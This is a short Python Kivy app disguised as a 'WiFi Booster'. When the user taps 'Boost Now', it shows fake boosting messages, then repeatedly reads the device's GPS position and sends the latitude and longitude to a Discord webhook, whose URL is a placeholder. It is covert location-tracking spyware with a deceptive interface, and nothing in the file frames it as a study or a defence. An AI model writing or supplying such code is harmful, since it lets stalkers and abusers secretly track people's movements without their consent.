from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
from kivy.uix.button import Button
from plyer import gps
import requests

class WiFiBoosterApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical')
        self.label = Label(text="Tap to Boost WiFi", font_size=24)
        self.button = Button(text="Boost Now", size_hint=(1, 0.3))
        self.button.bind(on_press=self.start_tracking)
        self.layout.add_widget(self.label)
        self.layout.add_widget(self.button)
        return self.layout

    def start_tracking(self, instance):
        self.label.text = "Boosting WiFi...\nPlease wait..."
        self.get_gps()
        Clock.schedule_interval(lambda dt: self.get_gps(), 300)

    def get_gps(self):
        try:
            gps.configure(on_location=self.send_location, on_status=self.on_status)
            gps.start(minTime=1000, minDistance=0)
        except NotImplementedError:
            self.label.text = "GPS not supported on this device"

    def send_location(self, **kwargs):
        lat = kwargs.get('lat')
        lon = kwargs.get('lon')
        if lat and lon:
            self.label.text = "WiFi Boost Complete!"
            data = {
                "content": f"Live Location:\nLatitude: {lat}\nLongitude: {lon}"
            }
            webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK"
            requests.post(webhook_url, json=data)
            gps.stop()

    def on_status(self, stype, status):
        print(f"GPS Status: {stype} = {status}")

if __name__ == '__main__':
    WiFiBoosterApp().run()
